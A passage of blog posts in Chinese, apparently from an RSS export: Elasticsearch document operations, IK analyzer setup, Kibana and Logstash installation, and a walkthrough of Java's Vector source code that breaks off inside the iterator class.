<h4 id="1-2-3-4-删除数据"><a href="#1-2-3-4-删除数据" class="headerlink" title="1.2.3.4 删除数据"></a>1.2.3.4 删除数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#删除索引user中文档id为1的数据</span><br><span class="line">DELETE	/user/_doc/1</span><br></pre></td></tr></table></figure>

<h4 id="1-2-3-5-批处理"><a href="#1-2-3-5-批处理" class="headerlink" title="1.2.3.5 批处理"></a>1.2.3.5 批处理</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#别忘了每一个大的json后都需要换行，别忘了每一个大的json后都需要换行，别忘了每一个大的json后都需要换行，pretty参数表示返回优雅的结果，可不加</span><br><span class="line"></span><br><span class="line">#批量新增（或全局修改），如果新增且不需要指定文档id，则把&quot;_id&quot;:N去掉即可</span><br><span class="line">POST	/user/_doc/_bulk?pretty</span><br><span class="line">&#123;&quot;index&quot;:&#123;&quot;_id&quot;:2&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:2, &quot;username&quot;:&quot;李四&quot;,&quot;gender&quot;:&quot;female&quot;,&quot;age&quot;:20&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&quot;_id&quot;:&quot;3&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:3, &quot;username&quot;:&quot;王五&quot;,&quot;gender&quot;:&quot;male&quot;&#125;</span><br><span class="line"></span><br><span class="line">#批量修改（局部修改，不是全量修改）</span><br><span class="line">POST	/user/_doc/_bulk</span><br><span class="line">&#123;&quot;update&quot;:&#123;&quot;_id&quot;:2&#125;&#125;</span><br><span class="line">&#123;&quot;doc&quot;:&#123;&quot;username&quot;: &quot;小花&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;update&quot;:&#123;&quot;_id&quot;:3&#125;&#125;</span><br><span class="line">&#123;&quot;doc&quot;:&#123;&quot;username&quot;: &quot;小西&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">#批量删除</span><br><span class="line">POST	/user/_doc/_bulk</span><br><span class="line">&#123;&quot;delete&quot;:&#123;&quot;_id&quot;:3&#125;&#125;</span><br><span class="line"></span><br><span class="line">#批量增删改混合使用</span><br><span class="line">POST	/user/_doc/_bulk</span><br><span class="line">&#123;&quot;index&quot;:&#123;&quot;_id&quot;:2&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:2, &quot;username&quot;:&quot;李四&quot;,&quot;gender&quot;:&quot;female&quot;,&quot;age&quot;:20&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&quot;_id&quot;:&quot;3&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:3, &quot;username&quot;:&quot;王五&quot;,&quot;gender&quot;:&quot;male&quot;&#125;</span><br><span class="line">&#123;&quot;update&quot;:&#123;&quot;_id&quot;:2&#125;&#125;</span><br><span class="line">&#123;&quot;doc&quot;:&#123;&quot;username&quot;: &quot;小花&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;update&quot;:&#123;&quot;_id&quot;:3&#125;&#125;</span><br><span class="line">&#123;&quot;doc&quot;:&#123;&quot;username&quot;: &quot;小西&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;delete&quot;:&#123;&quot;_id&quot;:3&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-2-4-IK分词器"><a href="#1-2-4-IK分词器" class="headerlink" title="1.2.4 IK分词器"></a>1.2.4 IK分词器</h3><ol>
<li>安装</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IK分词器（https://github.com/medcl/elasticsearch-analysis-ik/releases/tag/v6.4.2）,IK分词器中的分词器有ik_max_word，ik_smart。</span><br><span class="line">在elasticsearch/plugins下创建ik6.4.2目录，把zip放进去，解压，然后重启elasticsearch</span><br><span class="line"></span><br><span class="line">GET		/_analyze</span><br><span class="line">&#123;</span><br><span class="line">	&quot;analyzer&quot;:&quot;ik_max_word&quot;,</span><br><span class="line">	&quot;text&quot;:&quot;我是广东人&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>简单测试</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用es默认的分词器（standard分词器）对&quot;hello world&quot;进行分词</span><br><span class="line">GET		/_analyze</span><br><span class="line">&#123;</span><br><span class="line">	&quot;analyzer&quot;:&quot;standard&quot;,</span><br><span class="line">	&quot;text&quot;:&quot;hello world&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#以指定索引的某个字段进行分词（standard分词器）</span><br><span class="line">GET		/user/_analyze</span><br><span class="line">&#123;</span><br><span class="line">	&quot;analyzer&quot;:&quot;standard&quot;,</span><br><span class="line">	&quot;field&quot;:&quot;hobbies&quot;,</span><br><span class="line">	&quot;text&quot;:&quot;羽毛球&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>扩展字典</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#扩展字典“瞬狱影杀阵”</span><br><span class="line"></span><br><span class="line">#1.在ik6.4.2/config下创建custom.dic文件用于存放扩展字典</span><br><span class="line">瞬狱影杀阵</span><br><span class="line"></span><br><span class="line">#2.修改ik6.4.2/config/IKAnalyzer.cfg.xml，指定扩展字典的位置</span><br><span class="line">&lt;entry key=&quot;ext_dict&quot;&gt;custom.dic&lt;/entry&gt;</span><br><span class="line"></span><br><span class="line">#3.重启es服务</span><br><span class="line"></span><br><span class="line">#4.测试</span><br><span class="line">GET		/_analyze</span><br><span class="line">&#123;</span><br><span class="line">	&quot;analyzer&quot;:&quot;ik_max_word&quot;,</span><br><span class="line">	&quot;text&quot;:&quot;瞬狱影杀阵&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>字符过滤转换</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#添加索引并自定义分词器、过滤器</span><br><span class="line">PUT		/test-index</span><br><span class="line">&#123;</span><br><span class="line">	&quot;settings&quot;: &#123;</span><br><span class="line">		&quot;analysis&quot;: &#123;</span><br><span class="line">			&quot;char_filter&quot;: &#123;</span><br><span class="line">				&quot;&amp;_to_and&quot;: &#123;</span><br><span class="line">					&quot;type&quot;: &quot;mapping&quot;,</span><br><span class="line">					&quot;mappings&quot;: [&quot;&amp; =&gt; and&quot;]</span><br><span class="line">			    &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">			&quot;filter&quot;: &#123;</span><br><span class="line">				&quot;my_stopwords&quot;: &#123;</span><br><span class="line">					&quot;type&quot;: &quot;stop&quot;,</span><br><span class="line">					&quot;stopwords&quot;: [&quot;the&quot;, &quot;a&quot;]</span><br><span class="line">			    &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">			&quot;analyzer&quot;: &#123;</span><br><span class="line">				&quot;my_analyzer&quot;: &#123;</span><br><span class="line">					&quot;type&quot;: &quot;custom&quot;,</span><br><span class="line">					&quot;char_filter&quot;: [&quot;html_strip&quot;, &quot;&amp;_to_and&quot;],</span><br><span class="line">					&quot;tokenizer&quot;: &quot;standard&quot;,</span><br><span class="line">					&quot;filter&quot;: [&quot;lowercase&quot;, &quot;my_stopwords&quot;]</span><br><span class="line">			    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#测试自定义分词器、过滤器</span><br><span class="line">GET		/test-index/_analyze</span><br><span class="line">&#123;</span><br><span class="line">	&quot;text&quot;:&quot;The dog &amp; a cat!&quot;,</span><br><span class="line">	&quot;analyzer&quot;: &quot;my_analyzer&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-5-水平扩容"><a href="#1-2-5-水平扩容" class="headerlink" title="1.2.5 水平扩容"></a>1.2.5 水平扩容</h3><ul>
<li>分片数量在索引创建的时候就已经确定，且不能动态更改，但每个分片对应的副本数量可以动态更改（默认分片数number_of_shards为5，副本数number_of_replicas为1）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#把副本数量改为2</span><br><span class="line">PUT		/user/_settings</span><br><span class="line">&#123;</span><br><span class="line">    &quot;number_of_replicas&quot;: 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-kibana"><a href="#2-kibana" class="headerlink" title="2. kibana"></a>2. kibana</h1><h2 id="2-1-解压安装"><a href="#2-1-解压安装" class="headerlink" title="2.1 解压安装"></a>2.1 解压安装</h2><ul>
<li>解压</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf kibana-6.4.2-linux-x86_64.tar.gz -C /opt/module</span><br></pre></td></tr></table></figure>

<ul>
<li>在config&#x2F;kibana.yml最下面添加如下内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server.port: 5601</span><br><span class="line">server.host: &quot;0.0.0.0&quot;</span><br><span class="line">elasticsearch.url: &quot;http://localhost:9200&quot;</span><br><span class="line">kibana.index: &quot;.kibana&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>开启5601端口</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#kibana端口</span><br><span class="line">firewall-cmd --zone=public --add-port=5601/tcp --permanent</span><br><span class="line"></span><br><span class="line">#重新加载防火墙配置，使添加的端口生效</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<ul>
<li>启动kibana</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#切换到bin目录</span><br><span class="line">cd /opt/module/kibana-6.4.2-linux-x86_64/bin/</span><br><span class="line"></span><br><span class="line">#启动kibana，ip:port访问</span><br><span class="line">sh kibana &amp;</span><br></pre></td></tr></table></figure>

<h1 id="3-logstash"><a href="#3-logstash" class="headerlink" title="3. logstash"></a>3. logstash</h1><h2 id="3-1-解压安装"><a href="#3-1-解压安装" class="headerlink" title="3.1 解压安装"></a>3.1 解压安装</h2><ul>
<li>解压</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf logstash-6.4.2.tar.gz -C /opt/module</span><br></pre></td></tr></table></figure>

<ul>
<li>配置，案例：读取日志文件到es</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建配置目录</span><br><span class="line">mkdir -p /opt/module/logstash-6.4.2/config/conf</span><br><span class="line"></span><br><span class="line">#新增配置</span><br><span class="line">cat &lt;&lt;EOF&gt;/opt/module/logstash-6.4.2/config/conf/log_es.conf</span><br><span class="line">input &#123;</span><br><span class="line">  file &#123;</span><br><span class="line">    path =&gt; &quot;/opt/module/logs/*.log&quot;        #指定需要处理的日志</span><br><span class="line">    start_position =&gt; beginning</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">filter &#123;</span><br><span class="line">&#125;</span><br><span class="line">output &#123;</span><br><span class="line">  elasticsearch &#123;</span><br><span class="line">    hosts =&gt; &quot;localhost:9200&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>启动</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#切换到bin目录</span><br><span class="line">cd /opt/module/logstash-6.4.2/bin</span><br><span class="line"></span><br><span class="line">#启动logstash，便可在kibana看到logstash推送到es的日志</span><br><span class="line">sh logstash -f ../config/conf/log_es.conf &amp;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ELK</category>
      </categories>
      <tags>
        <tag>ELK</tag>
      </tags>
  </entry>
  <entry>
    <title>Vector源码分析</title>
    <url>/2023/06/02/$Vector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="1-new-Vector"><a href="#1-new-Vector" class="headerlink" title="1. new Vector()"></a>1. new Vector()</h1><p>实例化Vector，初始化默认为10（ArrayList无参构造初始化为空数组，add时才扩容为默认大小10），扩容增量默认为0。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Object数组实现</span></span><br><span class="line"><span class="keyword">protected</span> Object[] elementData;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 容器元素个数</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> elementCount;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩容增量</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> capacityIncrement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Vector</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-new-Vector-int-initialCapacity"><a href="#2-new-Vector-int-initialCapacity" class="headerlink" title="2. new Vector(int initialCapacity)"></a>2. new Vector(int initialCapacity)</h1><p>实例化Vector，并指定初始化大小，扩容增量默认为0。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Vector</span><span class="params">(<span class="type">int</span> initialCapacity)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(initialCapacity, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-new-Vector-int-initialCapacity-int-capacityIncrement"><a href="#3-new-Vector-int-initialCapacity-int-capacityIncrement" class="headerlink" title="3. new Vector(int initialCapacity, int capacityIncrement)"></a>3. new Vector(int initialCapacity, int capacityIncrement)</h1><p>实例化Vector，并指定初始化大小和扩容增值（每次扩容为原容量+增量，如果增量小于等于0，则扩容为原来2倍）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Vector</span><span class="params">(<span class="type">int</span> initialCapacity, <span class="type">int</span> capacityIncrement)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Illegal Capacity: &quot;</span>+</span><br><span class="line">                                           initialCapacity);</span><br><span class="line">    <span class="built_in">this</span>.elementData = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity];</span><br><span class="line">    <span class="built_in">this</span>.capacityIncrement = capacityIncrement;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="4-new-Vector-Collection-c"><a href="#4-new-Vector-Collection-c" class="headerlink" title="4. new Vector(Collection&lt;? extends E&gt; c)"></a>4. new Vector(Collection&lt;? extends E&gt; c)</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Vector</span><span class="params">(Collection&lt;? extends E&gt; c)</span> &#123;</span><br><span class="line">    elementData = c.toArray();</span><br><span class="line">    elementCount = elementData.length;</span><br><span class="line">    <span class="comment">// c.toArray might (incorrectly) not return Object[] (see 6260652)</span></span><br><span class="line">    <span class="keyword">if</span> (elementData.getClass() != Object[].class)</span><br><span class="line">        elementData = Arrays.copyOf(elementData, elementCount, Object[].class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="5-add-E-e"><a href="#5-add-E-e" class="headerlink" title="5. add(E e)"></a>5. add(E e)</h1><p>在数组尾部插入元素，与ArrayList的类似，但这里有同步锁synchronized。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    modCount++;</span><br><span class="line">    ensureCapacityHelper(elementCount + <span class="number">1</span>);</span><br><span class="line">    elementData[elementCount++] = e;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">ensureCapacityHelper</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">    <span class="comment">// overflow-conscious code</span></span><br><span class="line">    <span class="comment">// Vector第一次add时，不会扩容，默认elementData.length为10；ArrayList这里初始化为空数组，长度默认为0，会扩容</span></span><br><span class="line">    <span class="keyword">if</span> (minCapacity - elementData.length &gt; <span class="number">0</span>)</span><br><span class="line">        grow(minCapacity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最大数组长度：（2的31次方-1） - 8</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_ARRAY_SIZE</span> <span class="operator">=</span> Integer.MAX_VALUE - <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">grow</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">    <span class="comment">// overflow-conscious code</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">oldCapacity</span> <span class="operator">=</span> elementData.length;</span><br><span class="line">    <span class="comment">// ArrayList默认扩容为旧容量*1.5（向下取整），Vector扩容为旧容量+扩容增量（扩容增量小于等于0，则为旧容量*2）</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">newCapacity</span> <span class="operator">=</span> oldCapacity + ((capacityIncrement &gt; <span class="number">0</span>) ?</span><br><span class="line">                                     capacityIncrement : oldCapacity);</span><br><span class="line">    <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// 新容量 &lt; 最小容量，则新容量为最小容量</span></span><br><span class="line">        newCapacity = minCapacity;</span><br><span class="line">    <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">        newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">    elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最小容量 &gt; MAX_ARRAY_SIZE，则新容量为Integer.MAX_VALUE，反之为MAX_ARRAY_SIZE</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">hugeCapacity</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (minCapacity &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OutOfMemoryError</span>();</span><br><span class="line">    <span class="keyword">return</span> (minCapacity &gt; MAX_ARRAY_SIZE) ?</span><br><span class="line">        Integer.MAX_VALUE :</span><br><span class="line">    MAX_ARRAY_SIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="6-add-int-index-E-element"><a href="#6-add-int-index-E-element" class="headerlink" title="6. add(int index, E element)"></a>6. add(int index, E element)</h1><p>随机插入，过程与ArrayList对应的类似，但这里有同步锁synchronized。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">    insertElementAt(element, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">insertElementAt</span><span class="params">(E obj, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">if</span> (index &gt; elementCount) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArrayIndexOutOfBoundsException</span>(index</span><br><span class="line">                                                 + <span class="string">&quot; &gt; &quot;</span> + elementCount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 扩容过程，第5点分析过</span></span><br><span class="line">    ensureCapacityHelper(elementCount + <span class="number">1</span>);</span><br><span class="line">    System.arraycopy(elementData, index, elementData, index + <span class="number">1</span>, elementCount - index);</span><br><span class="line">    elementData[index] = obj;</span><br><span class="line">    elementCount++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="7-remove-int-index"><a href="#7-remove-int-index" class="headerlink" title="7. remove(int index)"></a>7. remove(int index)</h1><p>根据下标移除元素，与ArrayList的类似，但这里有同步锁synchronized。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> E <span class="title function_">remove</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= elementCount)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArrayIndexOutOfBoundsException</span>(index);</span><br><span class="line">    <span class="type">E</span> <span class="variable">oldValue</span> <span class="operator">=</span> elementData(index);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">numMoved</span> <span class="operator">=</span> elementCount - index - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">        System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                         numMoved);</span><br><span class="line">    <span class="comment">// index后的元素前移后，最后元素置为null</span></span><br><span class="line">    elementData[--elementCount] = <span class="literal">null</span>; <span class="comment">// Let gc do its work</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">E <span class="title function_">elementData</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (E) elementData[index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="8-remove-Object-o"><a href="#8-remove-Object-o" class="headerlink" title="8. remove(Object o)"></a>8. remove(Object o)</h1><p>删除第1个指定元素（从下标0开始），返回值：true - 删除成功；false - 删除失败。与ArrayList的类似，但这里有同步锁synchronized。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">remove</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> removeElement(o);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">boolean</span> <span class="title function_">removeElement</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexOf(obj);</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        removeElementAt(i);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">indexOf</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> indexOf(o, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">indexOf</span><span class="params">(Object o, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> index ; i &lt; elementCount ; i++)</span><br><span class="line">            <span class="keyword">if</span> (elementData[i]==<span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> index ; i &lt; elementCount ; i++)</span><br><span class="line">            <span class="keyword">if</span> (o.equals(elementData[i]))</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">removeElementAt</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= elementCount) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArrayIndexOutOfBoundsException</span>(index + <span class="string">&quot; &gt;= &quot;</span> +</span><br><span class="line">                                                 elementCount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArrayIndexOutOfBoundsException</span>(index);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> elementCount - index - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (j &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        System.arraycopy(elementData, index + <span class="number">1</span>, elementData, index, j);</span><br><span class="line">    &#125;</span><br><span class="line">    elementCount--;</span><br><span class="line">    elementData[elementCount] = <span class="literal">null</span>; <span class="comment">/* to let gc do its work */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="9-set-int-index-E-element"><a href="#9-set-int-index-E-element" class="headerlink" title="9. set(int index, E element)"></a>9. set(int index, E element)</h1><p>设置指定位置的元素，与ArrayList的类似，但这里有同步锁synchronized。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> E <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= elementCount)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArrayIndexOutOfBoundsException</span>(index);</span><br><span class="line"></span><br><span class="line">    <span class="type">E</span> <span class="variable">oldValue</span> <span class="operator">=</span> elementData(index);</span><br><span class="line">    elementData[index] = element;</span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="10-get-int-index"><a href="#10-get-int-index" class="headerlink" title="10. get(int index)"></a>10. get(int index)</h1><p>获取指定下标元素，与ArrayList的类似，但这里有同步锁synchronized。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= elementCount)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArrayIndexOutOfBoundsException</span>(index);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> elementData(index);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="11-size"><a href="#11-size" class="headerlink" title="11. size()"></a>11. size()</h1><p>获取容器元素个数，但这里有同步锁synchronized。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> elementCount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="12-迭代器-iterator"><a href="#12-迭代器-iterator" class="headerlink" title="12. 迭代器 - iterator()"></a>12. 迭代器 - iterator()</h1><p>与ArrayList的类似，但这里有同步锁synchronized。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Iterator&lt;E&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Itr</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Itr</span> <span class="keyword">implements</span> <span class="title class_">Iterator</span>&lt;E&gt; &#123;</span><br><span class="line">        <span class="type">int</span> cursor;       <span class="comment">// index of next element to return</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">lastRet</span> <span class="operator">=</span> -<span class="number">1</span>; <span class="comment">// index of last element returned; -1 if no such</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">expectedModCount</span> <span class="operator">=</span> modCount;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="comment">// Racy but within spec, since modifications are checked</span></span><br><span class="line">            <span class="comment">// within or after synchronization in next/previous</span></span><br><span class="line">            <span class="keyword">return</span> cursor != elementCount;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> E <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Vector.<span class="built_in">this</span>) &#123;</span><br><span class="line">                checkForComodification();</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor;</span><br><span class="line">                <span class="keyword">if</span> (i &gt;= elementCount)</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title 